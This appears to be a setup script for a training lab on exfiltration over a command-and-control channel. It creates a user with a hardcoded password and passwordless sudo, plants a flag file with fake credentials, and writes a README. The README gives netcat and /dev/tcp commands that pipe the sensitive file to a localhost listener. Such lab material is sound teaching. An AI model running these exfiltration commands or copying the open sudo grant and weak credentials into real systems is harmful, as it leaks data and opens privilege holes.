#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{C2_CHANNEL_EXFIL_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-c2; chmod 440 /etc/sudoers.d/player-c2
mkdir -p /opt/sensitive-data
echo "$FLAG" > /opt/sensitive-data/flag.txt
echo "db_creds=admin:S3cr3t2024" >> /opt/sensitive-data/flag.txt
echo "internal_ip=10.10.10.50" >> /opt/sensitive-data/flag.txt
chmod 644 /opt/sensitive-data/flag.txt
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1041 Exfiltration Over C2 Channel ===
Login  : player / Player@123
Goal   : Exfiltrate /opt/sensitive-data/flag.txt through a simulated C2 channel.
Step 1 : Start C2 listener: nc -lvnp 4444
Step 2 : In another terminal, send data over the channel:
         cat /opt/sensitive-data/flag.txt | nc localhost 4444
Step 3 : Also try: base64-encoded via C2:
         base64 /opt/sensitive-data/flag.txt | nc localhost 4444
Step 4 : Try a reverse shell carrying data:
         bash -c 'cat /opt/sensitive-data/flag.txt >/dev/tcp/localhost/4444'
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1041 setup complete."
